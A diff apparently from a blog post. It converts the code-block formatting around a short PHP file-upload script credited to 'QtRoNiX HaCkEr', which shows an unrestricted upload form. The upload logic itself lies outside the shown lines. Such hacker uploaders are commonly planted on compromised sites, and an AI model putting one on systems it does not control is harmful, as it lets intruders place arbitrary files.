@@ -15,7 +15,7 @@ A simple uploader script by QtRoNiX HaCkEr.
 
 ### Script Upload By QtRoNiX HaCkEr Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 echo '&lt;center&gt;&lt;font color="Red" size="4"&gt;';
 /// Script Upload By QtRoNiX HaCkEr \\\
 if(isset($_POST['Submit'])){
@@ -35,5 +35,5 @@ else{
 echo'&lt;form method="POST" action="#" enctype="multipart/form-data"&gt;&lt;input type="file" name="image"&gt;&lt;br&gt;&lt;input type="Submit" name="Submit" value="Upload"&gt;&lt;/form&gt;';
 }
 echo '&lt;/center&gt;&lt;/font&gt;';
-?&gt;
-</pre>
+?>
+{% endhighlight %}
